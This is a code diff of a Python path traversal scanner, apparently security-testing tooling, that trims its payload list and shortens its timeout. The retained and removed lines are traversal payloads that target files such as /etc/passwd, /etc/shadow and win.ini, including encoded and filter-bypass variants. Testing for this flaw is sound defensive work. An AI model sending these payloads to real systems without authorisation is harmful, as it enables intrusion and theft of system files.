@@ -17,38 +17,19 @@ class PathTraversalScanner:
     Tests for directory traversal and local file inclusion
     """
     
-    # Path traversal payloads
+    # Path traversal payloads (optimized)
     TRAVERSAL_PAYLOADS = [
         # Basic traversal
         "../../../etc/passwd",
         "..\\..\\..\\windows\\win.ini",
-        "../../../etc/shadow",
-        "..\\..\\..\\boot.ini",
         
         # URL encoded
         "..%2f..%2f..%2fetc%2fpasswd",
         "..%5c..%5c..%5cwindows%5cwin.ini",
         
-        # Double URL encoded
-        "..%252f..%252f..%252fetc%252fpasswd",
-        "..%255c..%255c..%255cwindows%255cwin.ini",
-        
-        # Unicode encoded
-        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
-        
         # Absolute paths
         "/etc/passwd",
         "C:\\windows\\win.ini",
-        "/etc/shadow",
-        "/etc/group",
-        "/etc/hosts",
-        "C:\\boot.ini",
-        "C:\\windows\\system32\\drivers\\etc\\hosts",
-        
-        # Null byte injection
-        "../../../etc/passwd%00",
-        "..\\..\\..\\windows\\win.ini%00",
         
         # Deep traversal
         "../../../../../../../../etc/passwd",
@@ -56,8 +37,7 @@ class PathTraversalScanner:
         
         # Filter bypass
         "....//....//....//etc/passwd",
-        "....\\\\....\\\\....\\\\windows\\win.ini",
-        "..;/..;/..;/etc/passwd",
+        "....\\\\....\\\\....\\\\windows\\win.ini"
     ]
     
     # File content signatures
@@ -84,7 +64,7 @@ class PathTraversalScanner:
         ]
     }
     
-    def __init__(self, timeout: int = 10):
+    def __init__(self, timeout: int = 5):
         """
         Initialize Path Traversal Scanner
         
